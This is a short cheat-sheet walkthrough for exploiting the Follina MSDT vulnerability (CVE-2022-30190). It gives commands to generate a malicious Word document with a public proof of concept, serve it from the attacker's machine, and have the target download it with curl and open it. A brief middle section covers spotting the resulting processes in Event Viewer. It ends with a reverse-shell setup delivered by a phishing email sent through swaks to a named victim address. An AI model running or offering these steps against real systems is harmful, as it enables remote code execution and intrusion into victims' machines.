## Follina MSDT (CVE-2022-30190)

Microsoft Support Diagnostic Tool (MSDT) is vulnerable with Follina.

1. **Download the Payload in Local Machine**

    Clone the payload from [msdt-follina](https://github.com/JohnHammond/msdt-follina).

2. **Create the Maldoc in Local Machine**

    ```sh
    # -i: interface name
    python3 follina.py -i eth0
    ```

    Then a new maldoc named “follina.doc” will be created in the current directory.  
    Now you’ve started the web server.

3. **Open Another Web Server in Local Machine**

    Open another terminal  and move to the msdt-follina directory,  then start web server to transfer the maldoc to target machine.

    ```sh
    python3 -m http.server 3456
    ```

4. **Transfer the Maldoc to Target Machine**

    In target Windows machine, open powershell and execute the following command.

    ```sh
    cd ~/Desktop
    curl http://<local-ip>:3456/follina.doc -o follina.docx
    ```

5. **Open the Maldoc**

    In target machine, open the maldoc you transfered.

    ```sh
    .\follina.docx
    ```

6. **Check the Process Explorer of Sysinternals in Target Machine**

    Find interesting processes in the Process Explorer.

7. **Check the Event Viewer in Target Machine to Detect Suspicious Processes**

    1. Go to "View" -> "Use Quick Filter"

    2. A search bar should appear on top of the logs. Choose “Find Event ID” on the right of the search bar, and enter “4688”(it means that “a new process has been created”) in a search bar.

    3. Open the Find (Ctrl+F) and enter “winword”. Then check the contents of results.

    4. Go to Options → Advanced Options

- **Reverse Shell via SMTP**

    If the target uses SMTP, you may be able to reverse shell using it.  
    Start the exploit to wait for reverse connections.

    ```sh
    sudo python3 follina.py -i tun0 -p 80 -r 4444
    ```

    Send e-mail to the target machine via SMTP using [swaks](https://github.com/jetmore/swaks).

    ```sh
    swaks --to victim@vulnerable.com --from test@test --server mail.vulnerable.com --body "http://<local-ip>/"
    ```
